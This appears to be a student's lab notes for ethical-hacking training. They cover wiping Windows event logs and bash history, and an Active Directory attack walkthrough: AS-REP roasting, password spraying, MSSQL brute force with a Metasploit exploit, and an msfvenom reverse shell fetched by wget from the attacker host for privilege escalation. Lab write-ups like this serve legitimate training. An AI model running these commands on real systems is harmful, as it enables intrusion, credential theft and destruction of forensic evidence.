+</p><p id="24d3addf-00cb-8041-9979-fbb277bd2700" class=""><strong>Clear_Event_Viewer_Logs.bat: </strong></p><p id="24d3addf-00cb-8078-b442-d90148984fb4" class="">Utility that can be used to wipe out the logs (security, system, application logs) of the target system </p><p id="24d3addf-00cb-80d3-9215-ca555ad06e62" class="">Simply run the .bat file and it will begin clearing logs </p><p id="24d3addf-00cb-803c-bc02-c51b0706f920" class="">
+</p><p id="24d3addf-00cb-80e6-a3e2-f5916f554fc6" class=""><strong>wevtutil: </strong></p><p id="24d3addf-00cb-80f5-8d05-dfe79832d4d3" class="">Command-line utility used to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, run queries, and export, archive, and clear logs.<br/></p><ol type="1" id="24d3addf-00cb-804b-b6d8-c6f1cec86265" class="numbered-list" start="1"><li>Open cmd with Admin privileges</li></ol><ol type="1" id="24d3addf-00cb-805f-b1a4-ffc4aa396f09" class="numbered-list" start="2"><li><em><strong>wevtutil el </strong></em></li></ol><p id="24d3addf-00cb-8033-86c6-ff6d761f5516" class="">Note: <em><strong>el | enum-logs </strong></em>lists event log names</p><ol type="1" id="24d3addf-00cb-80b6-b5fb-f1295c9828f1" class="numbered-list" start="3"><li><em><strong>wevtutil cl &lt;log name&gt; - </strong></em>Ex: <em><strong>wevtutil cl system </strong></em>or <em><strong>wevtutil cl application </strong></em>or <em><strong>wevtutil cl security</strong></em></li></ol><p id="24d3addf-00cb-80c1-a411-d2576b506407" class="">
+</p><p id="24d3addf-00cb-8069-95e2-c53fd584ec4e" class=""><strong>Cipher: </strong></p><p id="24d3addf-00cb-8029-95f2-de5dc20f711d" class="">Used to securely delete a chunk of data by overwriting it to prevent its possible recovery. </p><p id="24d3addf-00cb-806a-b711-e54dbd037633" class="">Encrypts/decrypts data in NTFS partitions</p><p id="24d3addf-00cb-80ba-8ddf-c781864decef" class="">
+</p><p id="24d3addf-00cb-80ee-8fb7-f14ada74297e" class=""><strong>Note</strong>: When an attacker creates a malicious text file and encrypts it, at the time of the encryption process, a backup file is created. Therefore, in cases where the encryption process is interrupted, the backup file can be used to recover the data. After the completion of the encryption process, the backup file is deleted, but this deleted file can be recovered using data recovery software and can further be used by security personnel for investigation. To avoid data recovery and to cover their tracks, <strong>attackers use the Cipher.exe tool to overwrite the deleted files.</strong><br/></p><ol type="1" id="24d3addf-00cb-80f9-b619-ebe2d78c104e" class="numbered-list" start="1"><li>In cmd - run <em><strong>cipher /w:[Drive / Folder / File location]</strong></em></li></ol><p id="24d3addf-00cb-8012-9aa4-d92e331420d2" class="">
+</p><h3 id="24d3addf-00cb-8073-823b-f1a4d99a89da" class="">Task 3: Clear Linux Machine Logs using the BASH Shell </h3><p id="24d3addf-00cb-80b1-b78a-cf29a3ace38b" class="">
+</p><p id="24d3addf-00cb-80d1-a377-df8638225bb7" class="">The <strong>BASH</strong> or Born Again Shell is a sh-compatible shell that <strong>stores command history in a file called bash history.</strong> (<em><strong>more ~/.bash_history</strong></em> command to view) </p><ul id="24d3addf-00cb-8066-ae08-ee5ec88848e2" class="bulleted-list"><li style="list-style-type:disc">Allows investigators to track origin of attack and see exact commands used by attackers</li></ul><p id="24d3addf-00cb-80e4-b0db-f0109e1e6da4" class="">
+</p><p id="24d3addf-00cb-80d0-ab02-e624ab72a8c8" class=""><em><strong>export HISTSIZE=0</strong></em></p><p id="24d3addf-00cb-8092-8607-ed7da40fa3c5" class="">Disables BASH shell from saving history</p><p id="24d3addf-00cb-808d-a64e-d64ff5d1d7d6" class=""><strong>Note:</strong> <em><strong>HISTSIZE</strong></em> determines the number of commands to be saved, which will be set to 0.<br/></p><p id="24d3addf-00cb-80ff-9e1f-fcefd2c17165" class=""><em><strong>history -c</strong></em></p><p id="24d3addf-00cb-80c5-8d5c-f8392bca9d8f" class="">Clears stored history</p><p id="24d3addf-00cb-8074-a215-f64fdf938c62" class=""><strong>Note: </strong> Effective alternative to the disabling history command; with history -c, you have the convenience of rewriting or reviewing the earlier used commands.<br/></p><p id="24d3addf-00cb-8066-a5e7-fe3dade355af" class=""><em><strong>history -w</strong></em></p><p id="24d3addf-00cb-8067-9ce3-d1bfff80d989" class="">Deletes history of current shell (leaving command history of other shells unaffected) </p><p id="24d3addf-00cb-803a-9ca4-d08da57297fa" class="">
+</p><p id="24d3addf-00cb-80f9-9a5b-cc9579567a9c" class=""><em><strong>shred ~/.bash_history </strong></em></p><p id="24d3addf-00cb-808d-983d-de33093d7307" class="">Shreds history file - making contents unreadable </p><p id="24d3addf-00cb-806a-88fd-d80e17c86152" class=""><strong>Note</strong>: This command is useful in cases where an investigator locates the file; because of this command, they would be unable to read any content in the history file.<br/></p><p id="24d3addf-00cb-8029-b57a-d1237eb02923" class=""><em><strong>shred ~/.bash_history &amp;&amp; cat /dev/null &gt; .bash_history &amp;&amp; history -c &amp;&amp; exit</strong></em></p><p id="24d3addf-00cb-80f2-8a26-fa8dbaca695e" class="">Shreds history file &gt; deletes it &gt; clears evidence of using the command</p><p id="24d3addf-00cb-80d2-982a-e7bb592a5211" class="">
+</p><p id="24d3addf-00cb-80f3-b214-d92af50951ba" class="">
+</p><p id="24d3addf-00cb-80cd-b8b6-c6b58d6e156c" class="">
+</p></div></details><p id="24d3addf-00cb-80b2-8c68-f19c6be9fcb4" class="">
+</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Lab 5: Perform Active Directory (AD) Attacks Using Various Tools </summary><div class="indented"><h3 id="24d3addf-00cb-8092-9404-c092bf586b41" class=""><em>Lab Objectives: </em></h3><p id="24d3addf-00cb-80dc-b641-f4a6f507dd4f" class="">▪ Perform initial scans to obtain domain controller IP and domain name </p><p id="24d3addf-00cb-8003-9e27-eb13c2fa92e4" class="">▪ perform AS-REP roasting attack </p><p id="24d3addf-00cb-808d-ad5f-e4929b571cf6" class="">▪ Spray cracked password into network using CrackMapExec </p><p id="24d3addf-00cb-80e9-92dd-df2c4bc6d5a6" class="">▪ Perform post-enumeration using PowerView </p><p id="24d3addf-00cb-80d0-b2a3-edc7b38c7dec" class="">▪ Perform attack on MSSQL service </p><p id="24d3addf-00cb-8030-984b-de9a032ecd1a" class="">▪ Perform privilege escalation </p><p id="24d3addf-00cb-8090-b75e-c5c815dfd41a" class="">▪ Perform Kerberoasting attack </p><p id="24d3addf-00cb-805c-8e01-f2e321b1c0a2" class="">
+</p><p id="24d3addf-00cb-8088-ab62-c1e3729c9202" class="">
+</p><h3 id="24d3addf-00cb-80d6-b216-f69ad80d49ff" class="">Task 1: Perform Initial Scans to Obtain Domain Controller IP and Domain Name</h3><p id="24d3addf-00cb-8075-80c4-c3c1b4356f55" class="">The initial scan in AD enumeration is crucial as it identifies the network structure, open ports, and services. </p><p id="24d3addf-00cb-803a-88d6-cd9499cef50b" class="">
+</p><p id="24d3addf-00cb-809e-a126-e394b094fec3" class="">Usie <strong>Nmap </strong>to perform initial scans on the domain controller (DC): </p><ol type="1" id="24d3addf-00cb-8007-acc2-cd8b4c26eb36" class="numbered-list" start="1"><li><em><strong>nmap 10.10.1.0/24</strong></em> to scan entire subject and identify DC’s IP address</li></ol><ol type="1" id="24d3addf-00cb-8042-acb5-c48ececd00c3" class="numbered-list" start="2"><li>Observe the nmap output carefully. Here, nmap shows that host 10.10.1.22 has <strong>port 88/TCP kerberos-sec</strong> and <strong>port 389/TCP LDAP</strong> opened which confirms that our DC IP address is 10.10.1.22.<figure id="24d3addf-00cb-8083-80f9-efdd2e81fa0e" class="image"><a href="image%2048.png"><img style="width:624px" src="image%2048.png"/></a></figure></li></ol><ol type="1" id="24d3addf-00cb-807f-9d6e-e854542e1deb" class="numbered-list" start="3"><li>Scan individual IP for more detail<ol type="a" id="24d3addf-00cb-80bf-b6d6-ebbd3702ddfc" class="numbered-list" start="1"><li><em><strong>nmap -A -sC -sV &lt;Target IP&gt;</strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-8088-8fd2-ca27781d02e8" class="numbered-list" start="4"><li>Results show Domain Name </li></ol><ol type="1" id="24d3addf-00cb-8043-9c80-c8b58e7f4199" class="numbered-list" start="5"><li>Now that we have Domain Name and DC IP - we can perform AS-REP Roasting attack</li></ol><p id="24d3addf-00cb-8085-a48f-e912e740bc53" class="">
+</p><h3 id="24d3addf-00cb-805e-b234-ff841170b5e1" class="">Task 2: Perform AS-REP Roasting Attack </h3><p id="24d3addf-00cb-8028-9b1e-deb253c9b654" class="">Targets user accounts in AD that do not require Kerberos pre-authentication - exploiting the DONT_REQ_PREAUTH setting</p><p id="24d3addf-00cb-80d8-be25-e872e2f8d347" class="">
+</p><ol type="1" id="24d3addf-00cb-8007-8bac-fd533e7e2b68" class="numbered-list" start="1"><li>Attackers can <strong>request a ticket-granting ticket (TGT)</strong> for these accounts without needing the user&#x27;s password</li></ol><ol type="1" id="24d3addf-00cb-8098-aece-d8e50c68755f" class="numbered-list" start="2"><li>DC responds with encrypted TGT, which attacker captures - TGT is encrypted with user’s PW hash</li></ol><ol type="1" id="24d3addf-00cb-80c5-8030-fb0fa89e9de2" class="numbered-list" start="3"><li>Password can then be cracked using offline password cracking tools like haschat / John the Ripper</li></ol><p id="24d3addf-00cb-8086-8dce-c567e4d6d6bd" class="">
+</p><p id="24d3addf-00cb-80a1-8690-dd496633b8c7" class="">In Linux Terminal: </p><ol type="1" id="24d3addf-00cb-808f-b470-dc25cf4d0785" class="numbered-list" start="1"><li><em><strong>cd impacket/examples/</strong></em></li></ol><ol type="1" id="24d3addf-00cb-8097-9fc5-f3772417cbe5" class="numbered-list" start="2"><li><em><strong>python3 GetNPUsers.py &lt;target domain (ex. CEH.com)&gt;/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip &lt;DC IP address&gt;</strong></em><ol type="a" id="24d3addf-00cb-80c4-a05b-fc06fc618051" class="numbered-list" start="1"><li><em><strong>GetNPUsers.py</strong></em>: Python script to retrieve AD user information. </li></ol><ol type="a" id="24d3addf-00cb-8000-a0bf-dc49ca7f1925" class="numbered-list" start="2"><li><em><strong>CEH.com/: </strong></em>Target AD domain. </li></ol><ol type="a" id="24d3addf-00cb-809f-a621-ea3168ce4649" class="numbered-list" start="3"><li><em><strong>-no-pass:</strong></em> Flag to find user accounts not requiring pre-authentication. </li></ol><ol type="a" id="24d3addf-00cb-8085-adc6-c79a46a076a6" class="numbered-list" start="4"><li>-<em><strong>usersfile</strong></em> ~/ADtools/users.txt: Path to the file with the user account list. </li></ol><ol type="a" id="24d3addf-00cb-8023-81e4-de3060ea3abb" class="numbered-list" start="5"><li><em><strong>-dc-ip 10.10.1.22:</strong></em> IP address of the DC to query.</li></ol></li></ol><ol type="1" id="24d3addf-00cb-8048-a098-dc12dbac86b0" class="numbered-list" start="3"><li>Observe to locate a user with DONT_REQUIRE_PREAUTH setting set </li></ol><ol type="1" id="24d3addf-00cb-80c2-a9e9-e0c04baccbf3" class="numbered-list" start="4"><li>Copy hash of that user and save it as <em><strong>&lt;filename.txt&gt;</strong></em><ol type="a" id="24d3addf-00cb-8064-8ece-cc389d43d099" class="numbered-list" start="1"><li><em><strong>echo ‘[hash value]’ &gt; joshua.txt</strong></em><figure id="24d3addf-00cb-8068-afe6-e46087cec33a" class="image"><a href="image%2049.png"><img style="width:816px" src="image%2049.png"/></a></figure></li></ol></li></ol><ol type="1" id="24d3addf-00cb-80c2-b88d-da0d9af5fb66" class="numbered-list" start="5"><li>Atttempt to crack the password hash<ol type="a" id="24d3addf-00cb-80a9-8a6a-c0a47a0300a6" class="numbered-list" start="1"><li><em><strong>john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt</strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-8015-a712-e1259b1e9a53" class="numbered-list" start="6"><li>See password in plain text </li></ol><p id="24d3addf-00cb-808f-90b8-c55bf530f65c" class="">
+</p><h3 id="24d3addf-00cb-8073-bc9b-cdc0cb9023eb" class="">Task 3: Spray Cracked Password into Network using CrackMapExec</h3><p id="24d3addf-00cb-8024-aaa7-f431106de9fb" class="">CME can be used to test passwords against numerous user accounts and services across a network</p><p id="24d3addf-00cb-80f5-b106-c05b4cfd3381" class="">
+</p><p id="24d3addf-00cb-8072-a04e-dd5c710fc59d" class="">From the <strong>Nmap results</strong> we can observe that other hosts in the subnet are running services such as <strong>RDP</strong>, <strong>SSH</strong>, and <strong>FTP</strong></p><p id="24d3addf-00cb-80dd-a855-f68463c33487" class="">Perform password spraying on RDP to check for correct credentials: </p><ol type="1" id="24d3addf-00cb-804f-a22c-ca769498ceb9" class="numbered-list" start="1"><li><em><strong>cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p &lt;“desired password”&gt; </strong></em><ol type="a" id="24d3addf-00cb-8031-a91f-e3b1711b96b4" class="numbered-list" start="1"><li><em><strong>rdp</strong></em>: Targets the Remote Desktop Protocol (RDP) service.</li></ol><ol type="a" id="24d3addf-00cb-80b2-8e07-f074f1bf014f" class="numbered-list" start="2"><li><em><strong>10.10.1.0/24</strong></em>: IP address range to target, encompassing all hosts within the subnet 10.10.1.0 with a subnet mask of 255.255.255.0.</li></ol><ol type="a" id="24d3addf-00cb-800e-ab5e-dd372442ec62" class="numbered-list" start="3"><li><em><strong>-u /root/ADtools/users.txt:</strong></em> Specifies the path to the file containing user accounts for authentication.</li></ol><ol type="a" id="24d3addf-00cb-8051-8bb3-db26208cf08e" class="numbered-list" start="4"><li>-<em><strong>p &quot;&lt;password&gt;&quot;: </strong></em>Password which we cracked using AS-REP Roasting to test against the RDP service on the specified hosts.<figure id="24d3addf-00cb-80bd-82b2-c55dc1f2f5d3" class="image"><a href="image%2050.png"><img style="width:702.9688110351562px" src="image%2050.png"/></a></figure></li></ol></li></ol><ol type="1" id="24d3addf-00cb-8024-9f48-dcfe104c2235" class="numbered-list" start="2"><li>After viewing other users using the password, attempt to connect to RDP as mark <ol type="a" id="24d3addf-00cb-80c8-bfa8-da8da3e4a284" class="numbered-list" start="1"><li>Search for <strong>remmina </strong>on Linux</li></ol><ol type="a" id="24d3addf-00cb-80f9-bfaa-efad2093eb16" class="numbered-list" start="2"><li>Enter IP obtained (Here 10.10.1.40)</li></ol></li></ol><p id="24d3addf-00cb-80f5-ad1b-f92b6e9bc64b" class="">
+</p><p id="24d3addf-00cb-8033-93aa-cc66923f9eaf" class="">
+</p><h3 id="24d3addf-00cb-80eb-8d25-ebc4646a10c6" class="">Task 4: Perform Post-Enumeration using PowerView </h3><p id="24d3addf-00cb-8014-ad32-f57c293382d2" class=""><strong>PowerView</strong> is a PowerShell tool designed for network and AD enumeration</p><p id="24d3addf-00cb-80a3-b2a1-dfe1fc5038f6" class="">Used to<strong> identify potential security weaknesses and misconfigurations</strong> in an <strong>AD environment.</strong> </p><p id="24d3addf-00cb-80b8-81ae-e210a9bd32df" class="">
+</p><ol type="1" id="24d3addf-00cb-80a1-84b7-ca53101c2a3d" class="numbered-list" start="1"><li><em><strong>cd /root/ADtools</strong></em></li></ol><ol type="1" id="24d3addf-00cb-804a-9c2b-fc7f2d2e3f0f" class="numbered-list" start="2"><li>Attempt post-enumeration to gather more info about AD </li></ol><ol type="1" id="24d3addf-00cb-806e-99e6-c3ae44efb95d" class="numbered-list" start="3"><li>Utilize <em><strong>PowerView.ps1 - </strong></em>Host python server on attacker machine to share script &gt;download onto the target machine (Mark) using the RDP session <ol type="a" id="24d3addf-00cb-8090-a052-e89e6308a20b" class="numbered-list" start="1"><li><em><strong>python3 -m http.server </strong></em></li></ol><ol type="a" id="24d3addf-00cb-80b1-843a-df71d89b1ec4" class="numbered-list" start="2"><li>Return to Remmina where RDP is active &gt;navigate to http://&lt;attackerIP&gt;:8000/Powerview.ps1 to automatically download the script</li></ol></li></ol><ol type="1" id="24d3addf-00cb-8023-949d-ec7df7388ca7" class="numbered-list" start="4"><li>Launch powershell on target device<ol type="a" id="24d3addf-00cb-80f2-b3cf-fa13bd7e7354" class="numbered-list" start="1"><li>Navigate to downloads folder: <em><strong>cd Downloads</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8088-84e9-fd382f2cec0b" class="numbered-list" start="2"><li>Enable script execution before loading script: <em><strong>pwoershell -EP Bypass</strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-809c-b336-f33339e7387f" class="numbered-list" start="5"><li>Execute the command: <em><strong>. .\PowerView.ps1</strong></em></li></ol><ol type="1" id="24d3addf-00cb-80d0-9284-e3215e0dc38a" class="numbered-list" start="6"><li>Display all the information related to computers in AD<ol type="a" id="24d3addf-00cb-80d8-a7d1-dead1db9f605" class="numbered-list" start="1"><li><em><strong>Get-NetComputer</strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-8077-8efc-d876633b2097" class="numbered-list" start="7"><li>List all groups in AD - helps identify targets for privilege escalation<ol type="a" id="24d3addf-00cb-80fe-a0df-d24ed5a84e46" class="numbered-list" start="1"><li><em><strong>Get-NetGroup</strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-809e-bed4-c76e29275c3d" class="numbered-list" start="8"><li>Retrieve detailed information about AD user accounts, such as usernames and group memberships<ol type="a" id="24d3addf-00cb-8029-88e4-f709171be4dd" class="numbered-list" start="1"><li><em><strong>Get-NetUser</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8014-a0a4-f99496d58cf8" class="numbered-list" start="2"><li>See SQL_srv user (has high privileges) </li></ol><figure id="24d3addf-00cb-80b7-ae79-d9cadfafa229" class="image"><a href="image%2051.png"><img style="width:576px" src="image%2051.png"/></a></figure><p id="24d3addf-00cb-807f-9b58-efc03d446b57" class="">
+</p></li></ol><ol type="1" id="24d3addf-00cb-8072-8eb8-cd9bff2174f9" class="numbered-list" start="9"><li>Additional commands for enumeration:<ol type="a" id="24d3addf-00cb-80f2-b896-fac257477f00" class="numbered-list" start="1"><li>Get-NetOU - Lists all organizational units (OUs) in the domain.</li></ol><ol type="a" id="24d3addf-00cb-8006-9340-ee88e4768694" class="numbered-list" start="2"><li>Get-NetSession - Lists active sessions on the domain. </li></ol><ol type="a" id="24d3addf-00cb-80d5-b9ca-d493b690b4bc" class="numbered-list" start="3"><li>Get-NetLoggedon - Lists users currently logged on to machines.</li></ol><ol type="a" id="24d3addf-00cb-805c-93ec-fb18aca7d0c7" class="numbered-list" start="4"><li>Get-NetProcess - Lists processes running on domain machines.</li></ol><ol type="a" id="24d3addf-00cb-80c9-9915-d1d613778746" class="numbered-list" start="5"><li>Get-NetService - Lists services on domain machines.</li></ol><ol type="a" id="24d3addf-00cb-8021-a77a-d926b5547170" class="numbered-list" start="6"><li>Get-NetDomainTrust - Lists domain trust relationships.</li></ol><ol type="a" id="24d3addf-00cb-8001-906a-eb761a982f43" class="numbered-list" start="7"><li>Get-ObjectACL - Retrieves ACLs for a specified object.</li></ol><ol type="a" id="24d3addf-00cb-80bd-b3f7-d463ca0d013b" class="numbered-list" start="8"><li>Find-InterestingDomainAcl - Finds interesting ACLs in the domain</li></ol><ol type="a" id="24d3addf-00cb-805c-be3b-c1705f16b922" class="numbered-list" start="9"><li>Get-NetSPN - Lists service principal names (SPNs) in the domain.</li></ol><ol type="a" id="24d3addf-00cb-80fe-a40b-d03d91d5fb51" class="numbered-list" start="10"><li>Invoke-ShareFinder - Finds shared folders in the domain.</li></ol><ol type="a" id="24d3addf-00cb-80c2-afe8-e0392c3584c7" class="numbered-list" start="11"><li>Invoke-UserHunter - Finds where domain admins are logged in.</li></ol><ol type="a" id="24d3addf-00cb-8015-9f25-ebe367fe9394" class="numbered-list" start="12"><li>Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access on specified machines</li></ol></li></ol><p id="24d3addf-00cb-8026-abb3-cdda63c7357a" class="">
+</p><p id="24d3addf-00cb-8041-8c1b-d16dd728f9b2" class="">
+</p><h3 id="24d3addf-00cb-8053-9453-d1b25ada0a32" class="">Task 5: Perform Attack on MSSQL service: </h3><p id="24d3addf-00cb-80cf-864d-da333cf368e3" class="">
+</p><p id="24d3addf-00cb-80a3-8ff5-f00c249c1e29" class=""><em><strong>xp_cmdshell</strong></em> is a SQL server stored procedure enabling command shell execution</p><p id="24d3addf-00cb-80be-9b8f-d8aaa7103ad9" class=""><strong>Misconfigured xp_cmdshell</strong> can lead to arbitrary command execution, data exfiltration, and potential network compromise, posing significant security risks</p><p id="24d3addf-00cb-8081-89fc-ea19521de88b" class=""><strong>Port 1443: </strong>Commonly associated with <strong>Microsoft SQL Server</strong> for <strong>encrypted connections</strong></p><p id="24d3addf-00cb-8008-8280-fd3c3dc736aa" class="">
+</p><p id="24d3addf-00cb-80fb-94e2-f7e9a581a803" class="">Using the identified SQL server from the previous scan (10.10.1.30) - port 1443 open</p><ol type="1" id="24d3addf-00cb-80c9-b72f-f75d94231903" class="numbered-list" start="1"><li>Save username in txt file - <em><strong>echo “SQL_srv”  &gt;&gt; &lt;filename&gt;.txt </strong></em>(will save to cwd) </li></ol><ol type="1" id="24d3addf-00cb-8003-be98-d68bc78c7834" class="numbered-list" start="2"><li>Brute force the MSSQL service password: <ol type="a" id="24d3addf-00cb-80c9-9b3d-e551cbbf0f18" class="numbered-list" start="1"><li><em><strong> hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql </strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-802c-8c00-d1f68fecc128" class="numbered-list" start="3"><li>Attempt to log into the service using <strong>mssqlclient.py</strong><ol type="a" id="24d3addf-00cb-80c7-b26a-fa5f0a5ec826" class="numbered-list" start="1"><li><strong>python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433</strong></li></ol><ol type="a" id="24d3addf-00cb-80b3-b240-cdfd9730a161" class="numbered-list" start="2"><li><strong>Note</strong>: Note the database name </li></ol></li></ol><ol type="1" id="24d3addf-00cb-80c0-8040-dd127929ab29" class="numbered-list" start="4"><li>Execute SQL query: <ol type="a" id="24d3addf-00cb-808f-9380-dd09c9e120aa" class="numbered-list" start="1"><li> <em><strong>SELECT name, CONVERT(ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name=&#x27;xp_cmdshell&#x27;;</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8007-8080-f91dcdfe1546" class="numbered-list" start="2"><li>If IsConfigured returns a value of 1 - <strong>xp_cmdshell </strong>is enabled and we can exploit the service </li></ol></li></ol><ol type="1" id="24d3addf-00cb-80bc-ba74-db31a6f59445" class="numbered-list" start="5"><li>Launch metasploit<ol type="a" id="24d3addf-00cb-8068-8d1e-d71638148b4e" class="numbered-list" start="1"><li><em><strong>msfconsole</strong></em></li></ol><ol type="a" id="24d3addf-00cb-803a-9dae-cd9dcfe3fd9f" class="numbered-list" start="2"><li><em><strong>use exploit/windows/mssql/mssql_payload</strong></em></li></ol><ol type="a" id="24d3addf-00cb-80eb-ac3f-f718949681be" class="numbered-list" start="3"><li><em><strong>set RHOST &lt;target IP&gt; </strong></em></li></ol><ol type="a" id="24d3addf-00cb-8035-8d9b-f539cc4ee9d3" class="numbered-list" start="4"><li><em><strong>set USERNAME &lt;username obtained&gt;</strong></em></li></ol><ol type="a" id="24d3addf-00cb-801e-952a-ddeac5c89993" class="numbered-list" start="5"><li><em><strong>set PASSWORD &lt;password obtained&gt; </strong></em></li></ol><ol type="a" id="24d3addf-00cb-8029-a80f-d6556180998d" class="numbered-list" start="6"><li><em><strong>set DATABASE &lt;database name obtained&gt;</strong></em></li></ol><ol type="a" id="24d3addf-00cb-80d2-811f-e510ef9a1d39" class="numbered-list" start="7"><li><em><strong>exploit</strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-8049-8bba-e08dd558d4e1" class="numbered-list" start="6"><li>Meterpreter session will open</li></ol><ol type="1" id="24d3addf-00cb-80aa-95a6-d7bd65c6003b" class="numbered-list" start="7"><li><em><strong>shell &gt; enter</strong></em></li></ol><ol type="1" id="24d3addf-00cb-8096-9820-f01ae1eb2edf" class="numbered-list" start="8"><li><em><strong>whoami - </strong></em>determine username of logged on user - here $sqlexpress (which is the sql service) </li></ol><p id="24d3addf-00cb-8006-b22b-d3243fe141af" class="">
+</p><h3 id="24d3addf-00cb-8014-b2b2-fac62fa6fb67" class="">Task 6: Perform Privilege Escalation </h3><p id="24d3addf-00cb-80c3-a490-ef3f96b464a7" class="">
+</p><p id="24d3addf-00cb-8000-bea7-ea658b722f61" class=""><strong>WinPEASx64.exe</strong> is a tool for Windows privilege escalation, identifying misconfigurations and vulnerabilities for potential exploitation.<br/></p><p id="24d3addf-00cb-8082-85df-f5468e77b993" class=""><strong>Unquoted Service Path vulnerability</strong> in the<strong> RunOnce registry key</strong> arises when a Windows <strong>service path lacks proper quotation marks and contains spaces</strong>, enabling attackers to execute arbitrary code with elevated privileges during system startup</p><p id="24d3addf-00cb-804c-8379-e40437c3b5b8" class="">
+</p><p id="24d3addf-00cb-80fc-983d-c85370cb8ff1" class="">Upload the WinPEAS.exe file to the target machine and execute it in Windows</p><p id="24d3addf-00cb-8012-9ec7-d5b82573f525" class="">In the meterpreter shell: </p><ol type="1" id="24d3addf-00cb-80c8-8efd-d32ca62a05d8" class="numbered-list" start="1"><li>If not already - <em><strong>shell</strong></em></li></ol><ol type="1" id="24d3addf-00cb-800c-822c-ee697c1ac684" class="numbered-list" start="2"><li><em><strong>cd C:\</strong></em></li></ol><ol type="1" id="24d3addf-00cb-8051-8636-fe843167b317" class="numbered-list" start="3"><li><em><strong>cd C:\Users\Public\Downloads</strong></em></li></ol><ol type="1" id="24d3addf-00cb-8037-9b3a-e51dcdd9a373" class="numbered-list" start="4"><li>Host winPEASx64.exe on the attacker machine with Python<ol type="a" id="24d3addf-00cb-80b2-95a9-ebe5100b1c4a" class="numbered-list" start="1"><li>Open new terminal</li></ol><ol type="a" id="24d3addf-00cb-804b-9611-e582a832147b" class="numbered-list" start="2"><li><em><strong>cd /root/ADtools</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8060-a7b7-d55d1af47afc" class="numbered-list" start="3"><li><em><strong>python3 -m http.server</strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-807a-a87f-ef6026782def" class="numbered-list" start="5"><li>Download winPEASx64.exe on the target machine using the open shell (meterpreter session) <ol type="a" id="24d3addf-00cb-8036-be9a-f086503d90f6" class="numbered-list" start="1"><li><em><strong>wget http://&lt;attackerIP&gt;:8000/winPEASx64.exe -o winpeas.exe</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8097-99d2-d1e83f295a90" class="numbered-list" start="2"><li>Execute via <em><strong>./winpeas.exe </strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-8014-8e9a-cd41014cbd54" class="numbered-list" start="6"><li>Observe file.exe - Unquoted and Space detected - Can be exploited for privilege escalation </li></ol><ol type="1" id="24d3addf-00cb-802c-8848-cb1be2b2ce73" class="numbered-list" start="7"><li>Open new terminal<ol type="a" id="24d3addf-00cb-80cf-b735-d967df05e11b" class="numbered-list" start="1"><li><em><strong>msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe &gt; /root/ADtools/file.exe </strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-8015-8cbe-c1f31f7ed67d" class="numbered-list" start="8"><li>Move back to shell terminal - cd to file path of file.exe (Here “C:\Program Files\CEH Services”) - <strong>Note: </strong>Ensure you are still in powershell, if not type <em><strong>powershell</strong></em><ol type="a" id="24d3addf-00cb-8098-854b-c3a973d47fb7" class="numbered-list" start="1"><li><em><strong>move file.exe file.bak ; wget http://&lt;attackerIP&gt;:8000/file.exe -o file.exe.</strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-80b5-a892-fe52bbfc1acc" class="numbered-list" start="9"><li>Navigate to the payload terminal<ol type="a" id="24d3addf-00cb-8048-8b2d-e8ed4d0bab86" class="numbered-list" start="1"><li><em><strong>nc -nvlp 8888 </strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-8024-b771-faad84077833" class="numbered-list" start="10"><li>Log into the Window Server 2019 machine (assuming the role of the victim) </li></ol><ol type="1" id="24d3addf-00cb-80e0-9bb6-ee8ca696a0e0" class="numbered-list" start="11"><li>On the parrot machine we have the shell to our nc listener, which is a privileged shell<em><strong><br/></strong></em></li></ol><p id="24d3addf-00cb-80c3-b7ac-fe2690880dd1" class="">
+</p><h3 id="24d3addf-00cb-8067-b235-f546db6f916c" class="">Task 7: Perform Kerberoasting Attack</h3><p id="24d3addf-00cb-8010-8489-e60fca187d91" class="">
+</p><p id="24d3addf-00cb-8017-ada4-cefd91c25c30" class=""><strong>Rubeus </strong>is a tool for exploiting Kerberos weaknesses</p><p id="24d3addf-00cb-8008-bb5d-ca8086d8ee62" class=""><strong>Kerberoasting </strong>is a method to extract ticket granting ticket (TGT) hashes from AD. </p><ul id="24d3addf-00cb-8032-96b4-e621b5c78641" class="bulleted-list"><li style="list-style-type:disc">Attackers target service accounts with associated Kerberos service principal names (SPNs). </li></ul><ul id="24d3addf-00cb-8069-bcb1-f5203bb83fc8" class="bulleted-list"><li style="list-style-type:disc">TGTs are requested from the DC for these accounts, then cracked offline to reveal user passwords. </li></ul><ul id="24d3addf-00cb-8074-9541-f6e744358acc" class="bulleted-list"><li style="list-style-type:disc">Kerberoasting exploits weak service account passwords and the nature of Kerberos authentication.</li></ul><p id="24d3addf-00cb-806c-abad-f4816030569e" class="">
